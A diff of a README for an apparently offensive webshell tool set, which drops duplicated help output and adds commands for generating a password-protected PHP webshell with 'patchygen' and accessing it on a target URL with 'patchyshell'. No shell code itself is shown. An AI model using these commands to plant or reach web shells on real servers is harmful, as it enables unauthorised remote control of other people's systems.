@@ -86,9 +86,6 @@ patchyshell http://somesite.com/shell.php shellname
 patchyshell help page:
 ```
 usage: accessshell.py [-h] [--password PASSWORD] target_url shell_name
-accessshell.py: error: the following arguments are required: target_url, shell_name
-Patricks-MacBook-Air:~ patrick$ patchyshell -h
-usage: accessshell.py [-h] [--password PASSWORD] target_url shell_name
 
 positional arguments:
   target_url           The target URL
@@ -98,3 +95,11 @@ optional arguments:
   -h, --help           show this help message and exit
   --password PASSWORD  password for shell
   ```
+  To generate a webshell with a password simply add -p option
+```
+patchygen ~/webshells/shell.php shellname -p passw0rd!
+```
+Once again this can be manually accessed from the browser. However, patchyshell makes it much easier to access and use the shell:
+```
+patchyshell http://somesite.com/shell.php shellname --password passw0rd!
+```
